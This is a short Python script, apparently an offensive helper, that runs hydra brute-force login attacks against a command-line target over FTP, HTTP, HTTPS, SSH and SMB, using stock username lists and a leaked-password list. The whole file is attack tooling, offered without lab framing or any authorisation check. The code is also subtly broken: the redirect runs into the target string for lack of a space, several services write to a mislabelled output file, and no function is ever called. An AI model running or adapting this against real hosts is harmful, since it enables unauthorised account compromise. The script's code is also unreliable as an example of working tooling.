#!/usr/bin/python

import sys, os, time
target = str(sys.argv[1])

def bforce_ftp():
	cmd500 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 21 -o "hydra_ftp.txt" ftp://' + target + '2>&1 | tee -a hydra.txt'
	os.system(cmd500)

def bforce_http():
	cmd510 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "hydra_http.txt" http://' + target + '2>&1 | tee -a hydra.txt'
	os.system(cmd510)

def bforce_https():
	cmd520 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 443 -o "hydra_http.txt" https://' + target + '2>&1 | tee -a hydra.txt'
	os.system(cmd520)
  
def bforce_ssh():
	cmd530 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "hydra_http.txt" ssh://' + target + '2>&1 | tee -a hydra.txt'
	os.system(cmd530)  
  
def bforce_smb():
	cmd540 = 'hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 139 -o "hydra_http.txt" smb://' + target + '2>&1 | tee -a hydra.txt'
	os.system(cmd540)  
